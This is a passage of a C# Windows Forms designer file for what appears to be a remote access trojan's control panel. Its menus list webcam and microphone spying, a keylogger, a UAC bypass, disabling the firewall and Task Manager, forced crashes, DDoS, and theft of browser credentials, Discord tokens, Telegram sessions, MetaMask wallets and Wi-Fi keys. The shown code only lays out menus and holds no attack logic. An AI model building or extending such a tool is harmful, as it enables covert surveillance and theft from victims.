		this.RunPEToolStripMenuItem2.Text = "[ RunPE ]";
		this.WebCamToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.WebCamToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("WebCamToolStripMenuItem1.Image");
		this.WebCamToolStripMenuItem1.Name = "WebCamToolStripMenuItem1";
		this.WebCamToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.WebCamToolStripMenuItem1.Text = "[ WebCam ]";
		this.MicrophoneToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.MicrophoneToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("MicrophoneToolStripMenuItem1.Image");
		this.MicrophoneToolStripMenuItem1.Name = "MicrophoneToolStripMenuItem1";
		this.MicrophoneToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.MicrophoneToolStripMenuItem1.Text = "[ Microphone ]";
		this.SystemSoundToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.SystemSoundToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("SystemSoundToolStripMenuItem1.Image");
		this.SystemSoundToolStripMenuItem1.Name = "SystemSoundToolStripMenuItem1";
		this.SystemSoundToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.SystemSoundToolStripMenuItem1.Text = "[ System Sound ]";
		this.OpenUrlToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.OpenUrlToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.VisibleToolStripMenuItem1, this.InvisibleToolStripMenuItem1 });
		this.OpenUrlToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("OpenUrlToolStripMenuItem1.Image");
		this.OpenUrlToolStripMenuItem1.Name = "OpenUrlToolStripMenuItem1";
		this.OpenUrlToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.OpenUrlToolStripMenuItem1.Text = "[ Open Url ]";
		this.VisibleToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.VisibleToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("VisibleToolStripMenuItem1.Image");
		this.VisibleToolStripMenuItem1.Name = "VisibleToolStripMenuItem1";
		this.VisibleToolStripMenuItem1.Size = new System.Drawing.Size(131, 22);
		this.VisibleToolStripMenuItem1.Text = "[ Visible ]";
		this.InvisibleToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.InvisibleToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("InvisibleToolStripMenuItem1.Image");
		this.InvisibleToolStripMenuItem1.Name = "InvisibleToolStripMenuItem1";
		this.InvisibleToolStripMenuItem1.Size = new System.Drawing.Size(131, 22);
		this.InvisibleToolStripMenuItem1.Text = "[ Invisible ]";
		this.OptionsToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.OptionsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[11]
		{
			this.BlankScreenToolStripMenuItem1, this.RegeditToolStripMenuItem1, this.FirewallToolStripMenuItem1, this.TaskMgrToolStripMenuItem1, this.UACToolStripMenuItem1, this.UpdateToolStripMenuItem2, this.ResetScaleToolStripMenuItem1, this.InvokeBSODToolStripMenuItem1, this.DeleteRestoreToolStripMenuItem1, this.Net35InstallToolStripMenuItem1,
			this.UninstallPluginsToolStripMenuItem
		});
		this.OptionsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("OptionsToolStripMenuItem.Image");
		this.OptionsToolStripMenuItem.Name = "OptionsToolStripMenuItem";
		this.OptionsToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.OptionsToolStripMenuItem.Text = "[ Options ]";
		this.BlankScreenToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.BlankScreenToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.EnableToolStripMenuItem6, this.DisableToolStripMenuItem6 });
		this.BlankScreenToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("BlankScreenToolStripMenuItem1.Image");
		this.BlankScreenToolStripMenuItem1.Name = "BlankScreenToolStripMenuItem1";
		this.BlankScreenToolStripMenuItem1.Size = new System.Drawing.Size(170, 22);
		this.BlankScreenToolStripMenuItem1.Text = "[ BlankScreen ]";
		this.EnableToolStripMenuItem6.BackColor = System.Drawing.Color.White;
		this.EnableToolStripMenuItem6.Image = (System.Drawing.Image)resources.GetObject("EnableToolStripMenuItem6.Image");
		this.EnableToolStripMenuItem6.Name = "EnableToolStripMenuItem6";
		this.EnableToolStripMenuItem6.Size = new System.Drawing.Size(126, 22);
		this.EnableToolStripMenuItem6.Text = "[ Enable ]";
		this.DisableToolStripMenuItem6.BackColor = System.Drawing.Color.White;
		this.DisableToolStripMenuItem6.Image = (System.Drawing.Image)resources.GetObject("DisableToolStripMenuItem6.Image");
		this.DisableToolStripMenuItem6.Name = "DisableToolStripMenuItem6";
		this.DisableToolStripMenuItem6.Size = new System.Drawing.Size(126, 22);
		this.DisableToolStripMenuItem6.Text = "[ Disable ]";
		this.RegeditToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.RegeditToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.EnableToolStripMenuItem8, this.DisableToolStripMenuItem8 });
		this.RegeditToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("RegeditToolStripMenuItem1.Image");
		this.RegeditToolStripMenuItem1.Name = "RegeditToolStripMenuItem1";
		this.RegeditToolStripMenuItem1.Size = new System.Drawing.Size(170, 22);
		this.RegeditToolStripMenuItem1.Text = "[ Regedit ]";
		this.EnableToolStripMenuItem8.BackColor = System.Drawing.Color.White;
		this.EnableToolStripMenuItem8.Image = (System.Drawing.Image)resources.GetObject("EnableToolStripMenuItem8.Image");
		this.EnableToolStripMenuItem8.Name = "EnableToolStripMenuItem8";
		this.EnableToolStripMenuItem8.Size = new System.Drawing.Size(126, 22);
		this.EnableToolStripMenuItem8.Text = "[ Enable ]";
		this.DisableToolStripMenuItem8.BackColor = System.Drawing.Color.White;
		this.DisableToolStripMenuItem8.Image = (System.Drawing.Image)resources.GetObject("DisableToolStripMenuItem8.Image");
		this.DisableToolStripMenuItem8.Name = "DisableToolStripMenuItem8";
		this.DisableToolStripMenuItem8.Size = new System.Drawing.Size(126, 22);
		this.DisableToolStripMenuItem8.Text = "[ Disable ]";
		this.FirewallToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.FirewallToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.EnableToolStripMenuItem10, this.DisableToolStripMenuItem10 });
		this.FirewallToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("FirewallToolStripMenuItem1.Image");
		this.FirewallToolStripMenuItem1.Name = "FirewallToolStripMenuItem1";
		this.FirewallToolStripMenuItem1.Size = new System.Drawing.Size(170, 22);
		this.FirewallToolStripMenuItem1.Text = "[ Firewall ]";
		this.EnableToolStripMenuItem10.BackColor = System.Drawing.Color.White;
		this.EnableToolStripMenuItem10.Image = (System.Drawing.Image)resources.GetObject("EnableToolStripMenuItem10.Image");
		this.EnableToolStripMenuItem10.Name = "EnableToolStripMenuItem10";
		this.EnableToolStripMenuItem10.Size = new System.Drawing.Size(126, 22);
		this.EnableToolStripMenuItem10.Text = "[ Enable ]";
		this.DisableToolStripMenuItem10.BackColor = System.Drawing.Color.White;
		this.DisableToolStripMenuItem10.Image = (System.Drawing.Image)resources.GetObject("DisableToolStripMenuItem10.Image");
		this.DisableToolStripMenuItem10.Name = "DisableToolStripMenuItem10";
		this.DisableToolStripMenuItem10.Size = new System.Drawing.Size(126, 22);
		this.DisableToolStripMenuItem10.Text = "[ Disable ]";
		this.TaskMgrToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.TaskMgrToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.EnableToolStripMenuItem9, this.DisableToolStripMenuItem9 });
		this.TaskMgrToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("TaskMgrToolStripMenuItem1.Image");
		this.TaskMgrToolStripMenuItem1.Name = "TaskMgrToolStripMenuItem1";
		this.TaskMgrToolStripMenuItem1.Size = new System.Drawing.Size(170, 22);
		this.TaskMgrToolStripMenuItem1.Text = "[ TaskMgr ]";
		this.EnableToolStripMenuItem9.BackColor = System.Drawing.Color.White;
		this.EnableToolStripMenuItem9.Image = (System.Drawing.Image)resources.GetObject("EnableToolStripMenuItem9.Image");
		this.EnableToolStripMenuItem9.Name = "EnableToolStripMenuItem9";
		this.EnableToolStripMenuItem9.Size = new System.Drawing.Size(126, 22);
		this.EnableToolStripMenuItem9.Text = "[ Enable ]";
		this.DisableToolStripMenuItem9.BackColor = System.Drawing.Color.White;
		this.DisableToolStripMenuItem9.Image = (System.Drawing.Image)resources.GetObject("DisableToolStripMenuItem9.Image");
		this.DisableToolStripMenuItem9.Name = "DisableToolStripMenuItem9";
		this.DisableToolStripMenuItem9.Size = new System.Drawing.Size(126, 22);
		this.DisableToolStripMenuItem9.Text = "[ Disable ]";
		this.UACToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.UACToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.EnableToolStripMenuItem7, this.DisableToolStripMenuItem7 });
		this.UACToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("UACToolStripMenuItem1.Image");
		this.UACToolStripMenuItem1.Name = "UACToolStripMenuItem1";
		this.UACToolStripMenuItem1.Size = new System.Drawing.Size(170, 22);
		this.UACToolStripMenuItem1.Text = "[ UAC ]";
		this.EnableToolStripMenuItem7.BackColor = System.Drawing.Color.White;
		this.EnableToolStripMenuItem7.Image = (System.Drawing.Image)resources.GetObject("EnableToolStripMenuItem7.Image");
		this.EnableToolStripMenuItem7.Name = "EnableToolStripMenuItem7";
		this.EnableToolStripMenuItem7.Size = new System.Drawing.Size(126, 22);
		this.EnableToolStripMenuItem7.Text = "[ Enable ]";
		this.DisableToolStripMenuItem7.BackColor = System.Drawing.Color.White;
		this.DisableToolStripMenuItem7.Image = (System.Drawing.Image)resources.GetObject("DisableToolStripMenuItem7.Image");
		this.DisableToolStripMenuItem7.Name = "DisableToolStripMenuItem7";
		this.DisableToolStripMenuItem7.Size = new System.Drawing.Size(126, 22);
		this.DisableToolStripMenuItem7.Text = "[ Disable ]";
		this.UpdateToolStripMenuItem2.BackColor = System.Drawing.Color.White;
		this.UpdateToolStripMenuItem2.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.EnableToolStripMenuItem11, this.DisableToolStripMenuItem11 });
		this.UpdateToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("UpdateToolStripMenuItem2.Image");
		this.UpdateToolStripMenuItem2.Name = "UpdateToolStripMenuItem2";
		this.UpdateToolStripMenuItem2.Size = new System.Drawing.Size(170, 22);
		this.UpdateToolStripMenuItem2.Text = "[ Update ]";
		this.EnableToolStripMenuItem11.BackColor = System.Drawing.Color.White;
		this.EnableToolStripMenuItem11.Image = (System.Drawing.Image)resources.GetObject("EnableToolStripMenuItem11.Image");
		this.EnableToolStripMenuItem11.Name = "EnableToolStripMenuItem11";
		this.EnableToolStripMenuItem11.Size = new System.Drawing.Size(126, 22);
		this.EnableToolStripMenuItem11.Text = "[ Enable ]";
		this.DisableToolStripMenuItem11.BackColor = System.Drawing.Color.White;
		this.DisableToolStripMenuItem11.Image = (System.Drawing.Image)resources.GetObject("DisableToolStripMenuItem11.Image");
		this.DisableToolStripMenuItem11.Name = "DisableToolStripMenuItem11";
		this.DisableToolStripMenuItem11.Size = new System.Drawing.Size(126, 22);
		this.DisableToolStripMenuItem11.Text = "[ Disable ]";
		this.ResetScaleToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.ResetScaleToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("ResetScaleToolStripMenuItem1.Image");
		this.ResetScaleToolStripMenuItem1.Name = "ResetScaleToolStripMenuItem1";
		this.ResetScaleToolStripMenuItem1.Size = new System.Drawing.Size(170, 22);
		this.ResetScaleToolStripMenuItem1.Text = "[ ResetScale ]";
		this.InvokeBSODToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.InvokeBSODToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("InvokeBSODToolStripMenuItem1.Image");
		this.InvokeBSODToolStripMenuItem1.Name = "InvokeBSODToolStripMenuItem1";
		this.InvokeBSODToolStripMenuItem1.Size = new System.Drawing.Size(170, 22);
		this.InvokeBSODToolStripMenuItem1.Text = "[ InvokeBSOD ]";
		this.DeleteRestoreToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.DeleteRestoreToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("DeleteRestoreToolStripMenuItem1.Image");
		this.DeleteRestoreToolStripMenuItem1.Name = "DeleteRestoreToolStripMenuItem1";
		this.DeleteRestoreToolStripMenuItem1.Size = new System.Drawing.Size(170, 22);
		this.DeleteRestoreToolStripMenuItem1.Text = "[ DeleteRestore ]";
		this.Net35InstallToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.Net35InstallToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("Net35InstallToolStripMenuItem1.Image");
		this.Net35InstallToolStripMenuItem1.Name = "Net35InstallToolStripMenuItem1";
		this.Net35InstallToolStripMenuItem1.Size = new System.Drawing.Size(170, 22);
		this.Net35InstallToolStripMenuItem1.Text = "[ .Net 3.5 Install ]";
		this.UninstallPluginsToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.UninstallPluginsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("UninstallPluginsToolStripMenuItem.Image");
		this.UninstallPluginsToolStripMenuItem.Name = "UninstallPluginsToolStripMenuItem";
		this.UninstallPluginsToolStripMenuItem.Size = new System.Drawing.Size(170, 22);
		this.UninstallPluginsToolStripMenuItem.Text = "[ RemovePlugins ]";
		this.ShellToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.ShellToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("ShellToolStripMenuItem.Image");
		this.ShellToolStripMenuItem.Name = "ShellToolStripMenuItem";
		this.ShellToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.ShellToolStripMenuItem.Text = "[ Shell ]";
		this.FileManagerToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.FileManagerToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("FileManagerToolStripMenuItem1.Image");
		this.FileManagerToolStripMenuItem1.Name = "FileManagerToolStripMenuItem1";
		this.FileManagerToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.FileManagerToolStripMenuItem1.Text = "[ File Manager ]";
		this.RecoveryOptionsToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.RecoveryOptionsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[8] { this.RunRecoveryToolStripMenuItem, this.ChromiumToolStripMenuItem, this.DiscordTokenToolStripMenuItem, this.TelegramSessionToolStripMenuItem, this.ProductKeyToolStripMenuItem1, this.MetaMaskToolStripMenuItem1, this.FileZillaToolStripMenuItem1, this.WifiKeysToolStripMenuItem1 });
		this.RecoveryOptionsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("RecoveryOptionsToolStripMenuItem.Image");
		this.RecoveryOptionsToolStripMenuItem.Name = "RecoveryOptionsToolStripMenuItem";
		this.RecoveryOptionsToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.RecoveryOptionsToolStripMenuItem.Text = "[ Recovery Options ]";
		this.RunRecoveryToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.RunRecoveryToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("RunRecoveryToolStripMenuItem.Image");
		this.RunRecoveryToolStripMenuItem.Name = "RunRecoveryToolStripMenuItem";
		this.RunRecoveryToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.RunRecoveryToolStripMenuItem.Text = "[ RunRecovery ]";
		this.ChromiumToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.ChromiumToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("ChromiumToolStripMenuItem.Image");
		this.ChromiumToolStripMenuItem.Name = "ChromiumToolStripMenuItem";
		this.ChromiumToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.ChromiumToolStripMenuItem.Text = "[ Chromium ]";
		this.DiscordTokenToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.DiscordTokenToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("DiscordTokenToolStripMenuItem.Image");
		this.DiscordTokenToolStripMenuItem.Name = "DiscordTokenToolStripMenuItem";
		this.DiscordTokenToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.DiscordTokenToolStripMenuItem.Text = "[ DiscordToken ]";
		this.TelegramSessionToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.TelegramSessionToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("TelegramSessionToolStripMenuItem.Image");
		this.TelegramSessionToolStripMenuItem.Name = "TelegramSessionToolStripMenuItem";
		this.TelegramSessionToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.TelegramSessionToolStripMenuItem.Text = "[ TelegramSession ]";
		this.ProductKeyToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.ProductKeyToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("ProductKeyToolStripMenuItem1.Image");
		this.ProductKeyToolStripMenuItem1.Name = "ProductKeyToolStripMenuItem1";
		this.ProductKeyToolStripMenuItem1.Size = new System.Drawing.Size(175, 22);
		this.ProductKeyToolStripMenuItem1.Text = "[ ProductKey ]";
		this.MetaMaskToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.MetaMaskToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("MetaMaskToolStripMenuItem1.Image");
		this.MetaMaskToolStripMenuItem1.Name = "MetaMaskToolStripMenuItem1";
		this.MetaMaskToolStripMenuItem1.Size = new System.Drawing.Size(175, 22);
		this.MetaMaskToolStripMenuItem1.Text = "[ MetaMask ]";
		this.FileZillaToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.FileZillaToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("FileZillaToolStripMenuItem1.Image");
		this.FileZillaToolStripMenuItem1.Name = "FileZillaToolStripMenuItem1";
		this.FileZillaToolStripMenuItem1.Size = new System.Drawing.Size(175, 22);
		this.FileZillaToolStripMenuItem1.Text = "[ FileZilla ]";
		this.WifiKeysToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.WifiKeysToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("WifiKeysToolStripMenuItem1.Image");
		this.WifiKeysToolStripMenuItem1.Name = "WifiKeysToolStripMenuItem1";
		this.WifiKeysToolStripMenuItem1.Size = new System.Drawing.Size(175, 22);
		this.WifiKeysToolStripMenuItem1.Text = "[ Wifi Keys ]";
		this.RegistryEditorToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.RegistryEditorToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("RegistryEditorToolStripMenuItem1.Image");
		this.RegistryEditorToolStripMenuItem1.Name = "RegistryEditorToolStripMenuItem1";
		this.RegistryEditorToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.RegistryEditorToolStripMenuItem1.Text = "[ Registry Editor ]";
		this.ActiveWindowsToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.ActiveWindowsToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("ActiveWindowsToolStripMenuItem1.Image");
		this.ActiveWindowsToolStripMenuItem1.Name = "ActiveWindowsToolStripMenuItem1";
		this.ActiveWindowsToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.ActiveWindowsToolStripMenuItem1.Text = "[ ActiveWindows ]";
		this.TCPConnectionsToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.TCPConnectionsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("TCPConnectionsToolStripMenuItem.Image");
		this.TCPConnectionsToolStripMenuItem.Name = "TCPConnectionsToolStripMenuItem";
		this.TCPConnectionsToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.TCPConnectionsToolStripMenuItem.Text = "[ TCP Connections ]";
		this.StartupManagerToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.StartupManagerToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("StartupManagerToolStripMenuItem1.Image");
		this.StartupManagerToolStripMenuItem1.Name = "StartupManagerToolStripMenuItem1";
		this.StartupManagerToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.StartupManagerToolStripMenuItem1.Text = "[ StartupManager ]";
		this.ProcessManagerToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.ProcessManagerToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("ProcessManagerToolStripMenuItem1.Image");
		this.ProcessManagerToolStripMenuItem1.Name = "ProcessManagerToolStripMenuItem1";
		this.ProcessManagerToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.ProcessManagerToolStripMenuItem1.Text = "[ Process Manager ]";
		this.ServiceManagerToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.ServiceManagerToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("ServiceManagerToolStripMenuItem1.Image");
		this.ServiceManagerToolStripMenuItem1.Name = "ServiceManagerToolStripMenuItem1";
		this.ServiceManagerToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.ServiceManagerToolStripMenuItem1.Text = "[ Service Manager ]";
		this.ClipboardManagerToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.ClipboardManagerToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("ClipboardManagerToolStripMenuItem1.Image");
		this.ClipboardManagerToolStripMenuItem1.Name = "ClipboardManagerToolStripMenuItem1";
		this.ClipboardManagerToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.ClipboardManagerToolStripMenuItem1.Text = "[ Clipboard Manager ]";
		this.InstalledProgramsToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.InstalledProgramsToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("InstalledProgramsToolStripMenuItem1.Image");
		this.InstalledProgramsToolStripMenuItem1.Name = "InstalledProgramsToolStripMenuItem1";
		this.InstalledProgramsToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.InstalledProgramsToolStripMenuItem1.Text = "[ Installed Programs ]";
		this.VBNetCompilerToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.VBNetCompilerToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("VBNetCompilerToolStripMenuItem1.Image");
		this.VBNetCompilerToolStripMenuItem1.Name = "VBNetCompilerToolStripMenuItem1";
		this.VBNetCompilerToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.VBNetCompilerToolStripMenuItem1.Text = "[ VB.NET Compiler ]";
		this.DDosAttackToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.DDosAttackToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("DDosAttackToolStripMenuItem1.Image");
		this.DDosAttackToolStripMenuItem1.Name = "DDosAttackToolStripMenuItem1";
		this.DDosAttackToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.DDosAttackToolStripMenuItem1.Text = "[ DDos Attack ]";
		this.LocationManagerToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.LocationManagerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("LocationManagerToolStripMenuItem.Image");
		this.LocationManagerToolStripMenuItem.Name = "LocationManagerToolStripMenuItem";
		this.LocationManagerToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.LocationManagerToolStripMenuItem.Text = "[ Location Manager ]";
		this.PastimeToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.PastimeToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("PastimeToolStripMenuItem1.Image");
		this.PastimeToolStripMenuItem1.Name = "PastimeToolStripMenuItem1";
		this.PastimeToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.PastimeToolStripMenuItem1.Text = "[ Pastime ]";
		this.PowerToolStripMenuItem2.BackColor = System.Drawing.Color.White;
		this.PowerToolStripMenuItem2.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.ShutdownToolStripMenuItem, this.RestartToolStripMenuItem4, this.LogoffToolStripMenuItem });
		this.PowerToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("PowerToolStripMenuItem2.Image");
		this.PowerToolStripMenuItem2.Name = "PowerToolStripMenuItem2";
		this.PowerToolStripMenuItem2.Size = new System.Drawing.Size(190, 22);
		this.PowerToolStripMenuItem2.Text = "[ Power ]";
		this.ShutdownToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.ShutdownToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("ShutdownToolStripMenuItem.Image");
		this.ShutdownToolStripMenuItem.Name = "ShutdownToolStripMenuItem";
		this.ShutdownToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
		this.ShutdownToolStripMenuItem.Text = "[ Shutdown ]";
		this.RestartToolStripMenuItem4.BackColor = System.Drawing.Color.White;
		this.RestartToolStripMenuItem4.Image = (System.Drawing.Image)resources.GetObject("RestartToolStripMenuItem4.Image");
		this.RestartToolStripMenuItem4.Name = "RestartToolStripMenuItem4";
		this.RestartToolStripMenuItem4.Size = new System.Drawing.Size(142, 22);
		this.RestartToolStripMenuItem4.Text = "[ Restart ]";
		this.LogoffToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.LogoffToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("LogoffToolStripMenuItem.Image");
		this.LogoffToolStripMenuItem.Name = "LogoffToolStripMenuItem";
		this.LogoffToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
		this.LogoffToolStripMenuItem.Text = "[ Logoff ]";
		this.Extra1ToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.Extra1ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[10] { this.ReportWindowToolStripMenuItem1, this.VoiceChatToolStripMenuItem, this.PerformanceToolStripMenuItem1, this.EditHostsToolStripMenuItem, this.KeyLoggerToolStripMenuItem1, this.ClientChatToolStripMenuItem, this.FilesSearcherToolStripMenuItem1, this.UACBypassToolStripMenuItem1, this.CommandsToolStripMenuItem, this.MessageBoxToolStripMenuItem });
		this.Extra1ToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("Extra1ToolStripMenuItem.Image");
		this.Extra1ToolStripMenuItem.Name = "Extra1ToolStripMenuItem";
		this.Extra1ToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.Extra1ToolStripMenuItem.Text = "[ Extra 1 ]";
		this.ReportWindowToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.ReportWindowToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.StartToolStripMenuItem, this.StopToolStripMenuItem });
		this.ReportWindowToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("ReportWindowToolStripMenuItem1.Image");
		this.ReportWindowToolStripMenuItem1.Name = "ReportWindowToolStripMenuItem1";
		this.ReportWindowToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
		this.ReportWindowToolStripMenuItem1.Text = "[ ReportWindow ]";
		this.StartToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.StartToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("StartToolStripMenuItem.Image");
		this.StartToolStripMenuItem.Name = "StartToolStripMenuItem";
		this.StartToolStripMenuItem.Size = new System.Drawing.Size(112, 22);
		this.StartToolStripMenuItem.Text = "[ Start ]";
		this.StopToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.StopToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("StopToolStripMenuItem.Image");
		this.StopToolStripMenuItem.Name = "StopToolStripMenuItem";
		this.StopToolStripMenuItem.Size = new System.Drawing.Size(112, 22);
		this.StopToolStripMenuItem.Text = "[ Stop ]";
		this.PerformanceToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.PerformanceToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("PerformanceToolStripMenuItem1.Image");
		this.PerformanceToolStripMenuItem1.Name = "PerformanceToolStripMenuItem1";
		this.PerformanceToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
		this.PerformanceToolStripMenuItem1.Text = "[ Performance ]";
		this.EditHostsToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.EditHostsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("EditHostsToolStripMenuItem.Image");
		this.EditHostsToolStripMenuItem.Name = "EditHostsToolStripMenuItem";
		this.EditHostsToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.EditHostsToolStripMenuItem.Text = "[ Edit Hosts ]";
		this.KeyLoggerToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.KeyLoggerToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.OfflineToolStripMenuItem1, this.OnlineToolStripMenuItem1 });
		this.KeyLoggerToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("KeyLoggerToolStripMenuItem1.Image");
		this.KeyLoggerToolStripMenuItem1.Name = "KeyLoggerToolStripMenuItem1";
